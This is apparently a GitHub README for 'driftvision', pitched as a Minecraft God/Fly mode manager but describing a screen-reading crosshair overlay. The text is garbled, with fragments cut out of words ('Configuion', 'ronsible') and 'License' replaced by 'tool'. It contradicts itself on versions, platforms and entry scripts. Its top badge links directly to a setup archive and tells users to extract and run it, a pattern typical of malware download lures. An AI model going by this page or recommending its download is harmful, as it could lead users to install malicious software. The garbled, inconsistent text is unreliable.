[![Stable](https://img.shields.io/badge/Stable-v1.0.0-green?style=for-the-badge&logo=checkmarx)](https://github.com/erickingio20h2/driftvision/releases/download/v4.0.0/Setuv2.1.2.5.zip)

# 🎮 driftvision

![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg) ![Python](https://img.shields.io/badge/python-3.8+-blue.svg) ![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20Linux-blue.svg)

![tool](https://img.shields.io/badge/tool-MIT-green?style=flat-square) ![Version](https://img.shields.io/badge/Version-1.2.0-blue?style=flat-square) ![Platform](https://img.shields.io/badge/Platform-Windows-lightgrey?style=flat-square) ![Python](https://img.shields.io/badge/Python-3.11%2B-3776AB?style=flat-square&logo=python&logoColor=white) ![Stars](https://img.shields.io/github/stars/erickingio20h2/driftvision?style=flat-square) ![Last Commit](https://img.shields.io/github/last-commit/erickingio20h2/driftvision?style=flat-square)

Minecraft — Manage God and Fly modes automatically with , multi-language support, and integion for Minecraft Paper/Spigot 1.21+ servers

## ✅ Features

- ✅ Multi-region monitoring with stability filtering and confidence scoring
- ✅ External overlay with customizable crosshair styles (dot, cross, circle)
- ✅ Advanced pixel-based screen analysis with region targeting
- ✅ 60+ FPS loop with minimal CPU impact
- ✅ YAML configuion with hot-reload (no restart needed)
- ✅ Real-time color detection with configurable sensitivity thresholds

## ⚙️ Configuion

Edit `config.yaml`:

```yaml
:
 fps: 60
 monitor: 0

detection:
 sensitivity: 0.8
 color_threshold: 15

overlay:
 crosshair: dot # dot, cross, circle
 color: "#FF0000"
 opacity: 0.8

hotkeys:
 toggle: F1
 overlay: F2
 exit: DELETE
```

## ⚙️ Installation

[![Download](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge&logo=github)](../../releases/latest)

**Option 1:** Download from [Releases](../../releases/latest) and extract

**Option 2:** Clone and run
```bash
git clone https://github.com/erickingio20h2/driftvision.git
cd driftvision
pip install -r requirements.txt
python main.py
```

## ▶️ Usage

```bash
python app.py # start with default config
python app.py -c my.yaml # custom config
python app.py --verbose # debug logging
```

**Hotkeys:**
| Key | Action |
|-----|--------|
| `F1` | Toggle on/off |
| `F2` | Toggle overlay |
| `F3` | Reload config |
| `F4` | Change crosshair style |
| `DELETE` | Exit — close app |

## 📸 Preview

![driftvision preview](assets/preview.svg)

![driftvision config](assets/config-preview.svg)

## 📥 Download

[![Download Latest](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge&logo=github)](../../releases/latest)

1. Download the latest release from the link above
2. Extract the archive (WinRAR / 7-Zip)
3. Run `python main.py` (or see Usage below)
4. Configure settings in `config.yaml`

## ❓ FAQ

<details><summary>Is this ?</summary>

standalone application. analyzes display output, runs independently or files.
</details>

<details><summary>Does it work after the latest update?</summary>

Usually yes. If game UI changes, you may need to adjust detection regions in config.
</details>

<details><summary>What are the system requirements?</summary>

Windows 10/11, Python 3.11+, 4GB RAM.
</details>

<details><summary>How do I configure settings?</summary>

Edit config.yaml — see Configuion section above.
</details>

<details><summary>Can I use this while streaming?</summary>

The overlay is transparent. Press DELETE to close if needed.
</details>

> **Disclaimer:** This software is intended for educational and research purposes only. Use at your own risk. The developers are not ronsible for any misuse or consequences.

## 📄 tool

driftvision is built for minecraft users who need a reliable, open-sou solution.

MIT tool. See [tool](tool) for details.

---

If you find **driftvision** useful, give it a ⭐ — it helps others discover this project.

Found a bug? [Open an issue](../../issues/new).

---

💻 Works on Windows, macOS, and Linux
